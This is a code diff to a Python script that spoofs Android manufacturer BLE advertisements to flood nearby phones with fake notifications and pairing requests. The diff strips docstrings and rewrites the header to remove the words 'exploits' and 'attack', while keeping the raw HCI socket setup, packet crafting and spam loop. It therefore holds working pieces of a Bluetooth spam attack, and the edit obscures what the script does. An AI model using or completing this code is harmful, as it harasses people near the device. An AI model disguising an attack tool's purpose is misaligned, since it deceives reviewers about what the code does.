@@ -1,12 +1,7 @@
 """
-Android Spam BLE Advertisement Broadcaster
-
 This script broadcasts fake Android device BLE advertisements to nearby Android devices.
-It exploits Android's proximity advertising by sending spoofed advertisement packets
-that trigger notifications and pairing requests on Android devices.
-
-This attack targets various Android device manufacturers and uses their manufacturer IDs
-to craft convincing advertisements.
+It targets various Android device manufacturers and uses their manufacturer IDs
+to craft advertisements.
 
 WARNING: This is for educational purposes only. Use responsibly and only on devices
 you own or have permission to test.
@@ -47,7 +42,6 @@ PREP_DATA = bytes.fromhex("010002000101FF000001")
 
 
 def init_hci_device(dev_num):
-    """Initialize HCI device for Bluetooth operations."""
     try:
         s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
         data = array.array("b", struct.pack("H", dev_num))
@@ -60,7 +54,6 @@ def init_hci_device(dev_num):
 
 
 def craft_adv_packet(mfg_id, dev_bytes):
-    """Construct BLE advertisement packet payload."""
     mfg_data = struct.pack('<H', mfg_id) + PREP_DATA + dev_bytes
     pkt_len = len(mfg_data) + 1
     return ADV_HEADER + bytes([pkt_len, 0xFF]) + mfg_data
@@ -81,17 +74,7 @@ def broadcast_adv(socket_obj, packet):
     time.sleep(0.03)
 
 
-def android_spam(device_ids, duration=60, interval=1):
-    """
-    Execute Android advertisement spam campaign.
-    
-    Args:
-        device_ids (list): HCI device identifiers
-        duration (int): Campaign duration in seconds
-        interval (int): Packet interval in seconds
-    """
-    
-    
+def android_spam(device_ids, duration=60, interval=1):    
     active_socks = []
     
     try:
